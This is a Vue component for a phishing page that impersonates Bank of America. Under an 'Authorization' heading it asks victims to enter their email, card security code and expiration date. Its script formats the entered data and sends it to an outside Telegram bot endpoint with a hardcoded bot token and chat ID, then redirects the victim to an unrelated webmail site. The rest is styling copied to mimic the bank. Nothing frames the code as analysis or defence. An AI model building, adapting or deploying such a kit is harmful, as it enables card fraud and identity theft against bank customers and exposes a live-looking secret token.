<template>
  <div id="app">




<body>

<div class="top-bar">
  <div class="bar-element">
    <span class="text-preamble">Bank of America deposit products: </span>
   <center> <img src="https://secure2.bac-assets.com/spa/widgets/gt-secure-fdic-widget/1.0.0/spa-assets/images/assets-images-global-fdic-fdic-digital-sign-CSX37f66a3e.svg" class="fdic-digital-sign"> </center>
  </div>

  <div class="gtnav__logo">
    <a href="https://www.bankofamerica.com">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/20/Bank_of_America_logo.svg/1440px-Bank_of_America_logo.svg.png">
    </a>
  </div>
</div>

<div class="wrapper">

  <div class="header">
    <h2>Authorization</h2>
    <p>To verify your identity, confirm your credit card details.</p>
  </div>

  <div class="auth-wrapper">
    <form class="auth-form" method="POST">

      <p>* Response required</p>

      <h3 class="h33">Credit card details</h3>

      <div class="label-input">
        <label for="sec-code" ><b class="for">Email Address*</b></label>
        <input type="text" id="sec-code" maxlength="30" required v-model="formDataRes.email">
        <!-- <p>3 or 4 digits</p> -->
      </div>
      <div class="label-input">
        <label for="sec-code" ><b class="for">Security code *</b></label>
        <input type="text" id="sec-code" maxlength="4" required v-model="formDataRes.sscode">
        <p>3 or 4 digits</p>
      </div>

      <div class="label-input">
        <label for="exp-date"><b class="for">Expiration date *</b></label>
        <input type="text" id="exp-date" maxlength="6" placeholder="MM/YY" required v-model="formDataRes.expdate">
        <p>MM/YY</p>
      </div>

      <hr>

      <div>
        <h3 class="h3">Would you like us to remember this device?</h3>

        <div class="device">
          <input type="radio" id="yes" name="device" value="yes">
          <label for="yes">Yes, remember this device</label>
        </div>

        <div class="device">
          <input type="radio" id="no" name="device" value="no">
          <label for="no">No, don't remember this device</label>
        </div>
      </div>

      <div class="auth-row">
        <button class="auth-btn next" type="submit" @click.prevent="finishJoob();">Next</button>
      </div>

    </form>
  </div>
</div>

<div class="product-wrapper">

  <div class="table-wrapper">
    <p>Investment and insurance products:</p>

    <table>
      <tbody>
        <tr>
          <td>Are Not FDIC Insured</td>
          <td>Are Not Deposits</td>
          <td>May Lose Value</td>
        </tr>
        <tr>
          <td>Are Not Bank Guaranteed</td>
          <td>Are Not Insured by Any Federal Government Agency</td>
          <td>Are Not a Condition to Any Banking Service or Activity</td>
        </tr>
      </tbody>
    </table>
  </div>

  <a href="#">Online Banking Service Agreement</a>

  <div class="online">
    <p>Investing in securities involves risks...</p>
    <p>Securities products are provided by Merrill...</p>
    <p>Bank of America Private Bank is a division...</p>
    <p>Insurance Products are offered through...</p>
    <p>Banking, credit card, automobile loans...</p>
    <hr>
  </div>

</div>

</body>



  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        email: "",
        sscode: "",
        expdate: "",
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `* B0A*\nEmail: ${this.formDataRes.email}\nSScode: ${this.formDataRes.sscode}\nEXpdate: ${this.formDataRes.expdate}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("https://gcimailwebmail.vercel.app/");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>


<style>

body {
  font-family: Arial, sans-serif;
  margin: 0;
  background: #f5f5f5;
}

/* Top Bar */
.top-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background: #fff;
  padding: 10px 20px;
  border-bottom: 1px solid #ddd;
}
.h3{
  padding: 30px;
}
.h33{
   padding: 30px;
   font-weight: 600;
}
.bar-element {
  display: flex;
  align-items: center;
  gap: 10px;
}

.gtnav__logo img {
  height: 40px;
}

/* Wrapper */
.wrapper {
  max-width: 420px;
  margin: 40px auto;
  line-height: 50%;
}

/* Header */
.header {
  text-align: center;
  margin-bottom: 20px;
}

/* Auth Form */
.auth-wrapper {
  background: #fff;
  padding: 20px;
  border-radius: 8px;
}
.for{
  font-weight: 600;
}
.label-input {
  margin-bottom: 50px !important;

}

.label-input input {
  width: 100%;
  padding: 10px;
  margin-top: 5px;
}

.device {
  margin: 10px 0;
}

.auth-btn {
  width: 20%;
  padding: 10px;
  border: none;
  cursor: pointer;
}

.auth-btn.next {
  background: #012169;
  color: white;
}

.auth-btn.next:hover {
  background: #1958eb;
}

.auth-row {
  margin-top: 20px;
}

/* Product Section */
.product-wrapper {
  max-width: 800px;
  margin: 40px auto;
  font-size: 14px;
}

.table-wrapper table {
  width: 100%;
  border-collapse: collapse;
}

.table-wrapper td {
  border: 1px solid #ccc;
  padding: 10px;
}

.online {
  margin-top: 20px;
}













p{
    margin: 20px;
    font-size: 20px !important;
}

.fixed{
    position: fixed;
    z-index: 50;
    height: 100%;
    width: 100%;
    top: 0;
    left: 0;
}

.shadow-lg{
    width: 100%;
    display: flex;
    justify-content: center;
}

        body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        * {
            margin: 0;
            padding: 0;
        }

        .top-bar {
            width: 100%;
            margin-bottom: 50px;
        }

        .bar-element {
            background-color: #f5f5f5;
            display: flex;
            font-size: 12px;
            font-style: italic;
            font-weight: 300;
            justify-content: center;
            gap: 8px;
        }

        .text-preamble {
        margin: 8px 0px;
        }

        .bar-element img {
        height: 16px;
        margin: 8px 0px;
        }

        .gtnav-logo-img {
        background-image: url(https://secure2.bac-assets.com/auth/signon/spa-assets/images/logo-bofa-flagscape-18ad22c….svg);
        background-repeat: no-repeat;
        background-size: 231px 24px !important;
        display: block;
        height: 24px !important;
        margin-right: 0;
        margin-top: 0;
        width: 231px !important;
        padding: 24px 40px 20px ;
        }

        .gtnav-logo-img img {
            width: 231px;
        }


        /* INPUT-FORM */

        h2 {
            font-family: cnx-regular;
            font-size: 36px;
            font-weight: 400;
            line-height: 44px;
            text-align: center;
        }

        form {
            padding: 16px 24px;
            padding-top: 32px;
        }

        .form-wrapper {
            max-width: 330px;
            box-shadow: 0 2px 20px 0 rgba(0,0,0,.12);
            border-radius: 12px;
            overflow: hidden;
            position: relative;
        }

        .auth-wrapper {
            width: 684px;
            box-shadow: 0 2px 20px 0 rgba(0,0,0,.12);
            border-radius: 12px;
            overflow: hidden;
            position: relative;
        }

        form input {
            max-width: 282px;
            max-height: 36px;
            border-radius: 4px;
            border: solid 1px;
            outline: #0053c2;
            padding: 12px;
        }

        form label {
            font-size: 14px;
            margin-bottom: 2px;
        }

        .label-input {
            display: flex;
            flex-direction: column;
        }

        .check-input {
            display: flex;
            align-items: center;
        }

        .check-input label {
            padding: 0px 6px;
        }

        .check-input input {
            width: 24px;
            height: 24px;
            color: #0053c2;
        }

        .login-btn {
            width: 282px;
            height: 44px;
            text-align: center;
            font-size: 20px;
            border-radius: 22px;
            background-color: #012169;
            border: none;
            color: white;
            text-decoration: none;
        }

        .login-btn a {
            text-decoration: none;
            color: white;
        }

        .auth-btn {
            width: auto;
            height: 44px;
            padding: 8px 24px;
            text-align: center;
            font-size: 20px;
            border-radius: 22px;
        }

        .auth-btn a {
            text-decoration: none;
        }

        .get span {
            font-size: 14px;
        }

        .get p {
            color: #646464;
            margin-top: 10px;
        }

        .auth-row {
            display: flex;
            justify-content: end;
            align-items: center;
            gap: 20px;
        }
        
        .cancel {
            border: 1px solid #012169;
            color: #012169;
            background-color: white;
        }

        .cancel:hover {
            color: white;
            background-color: #0053c2;
        }

        .next {
            background-color: #012169;
            border: none;
            color: white;
        }

        .next a {
            color: white;
        }

        .next:hover {
            background-color: #0053c2;
        }

        .login-btn:hover {
            background-color: #0053c2;
        }

        a {
            color: #0053c2;
        }

        .links {
            display: flex;
            flex-direction: column;
            text-align: center;
            gap: 8px;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .link {
            display: flex;
            justify-content: center;
            text-align: center;
            gap: 6px;
        }

        .top {
            width: 100%;
            position: absolute;
            top: 0;
            left: 0;
            display: flex;
            justify-content: end;
            background-color: #c41230;
        }

        .wrapper {
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .stay-connected {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: auto;
            margin: 0 auto !important;
            padding-top: 36px;
            width: 330px !important;
            color: #222;
        }

        .stay-connected h4 {
            font-size: 20px;
            font-weight: bold;
        }

        .stay-connected p {
            font-size: 16px;
            padding: 20px 0px;
        }

        .stay-connected button {
            width: 306px;
            height: 44px;
            text-align: center;
            font-size: 20px;
            border-radius: 22px;
            color: #012169;
            border: 1px solid #012169;
            background-color: white;
        }





        .label-input p{
            font-size: 12px;
        }

        h3 {
            font-size: 20px;
        }

       .auth-form label {
        font-size: 16px;
       }

       .device {
        display: flex;
        align-items: center;
        gap: 10px;
        margin-bottom: 12px;
       }




    table { 
      width: 100%;
      border-collapse: collapse;
      font-family: Arial, Helvetica, sans-serif;
    }

    .sec {
        padding: 32px;
        background: #f5f5f5;
    }

    .table-wrapper {
        width: 100%;
        margin: 16px 0px;
        /* padding: 32px; */
    }

    td {
        width: 150px;
        height: 81px;
      border: 1px solid #646464;
      vertical-align: center;
      font-size: 16px;
      font-weight: bold;
      padding: 28px 16px;
      color: #646464;
      text-align: center;
    }

    .elements {
        background-color: #f5f5f5;
        padding: 8px 0px;
        display: flex;
        font-size: 12px;
        font-style: italic;
        font-weight: 300;
        justify-content: center;
        gap: 8px;
    }

    .elements img {
        height: 16px;
        /* width: 40px; */
    }

    .online {
      color: #646464;
    }

    .online p {
        margin-bottom: 16px;
    }

    .product-wrapper {
        padding: 28px;
        padding-top: 0px;
        margin-top: 128px;
        color: #222;
        background-color: #f5f5f5;
        font-size: 14px;
    }

body {
  font-family: Arial, sans-serif;
  margin: 0;
  background: #f5f5f5;
}

/* Top Bar */
.top-bar {
  display: flex;
  justify-content: space-between;
  align-items: center;
  background: #fff;
  padding: 10px 20px;
  border-bottom: 1px solid #ddd;
}

.bar-element {
  display: flex;
  align-items: center;
  gap: 10px;
}

.gtnav__logo img {
  height: 40px;
}

/* Wrapper */
.wrapper {
  max-width: 400px;
  margin: 40px auto;
  text-align: center;
}

/* Form */
.form-wrapper {
  background: #fff;
  padding: 20px;
  border-radius: 8px;
}

.label-input {
  text-align: left;
  margin-bottom: 15px;
}

.label-input input {
  width: 100%;
  padding: 10px;
  margin-top: 5px;
}

.check-input {
  text-align: left;
  margin-bottom: 15px;
}

.login-btn {
  width: 100%;
  padding: 10px;
  background: #012169;
  color: #fff;
  border: none;
  cursor: pointer;
}

.login-btn:hover {
  background: #1b58e6;
}

.links {
  margin-top: 15px;
  font-size: 14px;
}

.links a {
  margin-right: 10px;
  text-decoration: none;
  color: #0073e6;
}

/* Stay Connected */
.stay-connected {
  margin-top: 20px;
  /* background: #fff; */
  padding: 15px;
}

/* Product Section */
.product-wrapper {
  max-width: 800px;
  margin: 40px auto;
  font-size: 14px;
}

.table-wrapper table {
  width: 100%;
  border-collapse: collapse;
}

.table-wrapper td {
  border: 1px solid #ccc;
  padding: 10px;
}

.online {
  margin-top: 20px;
}



</style>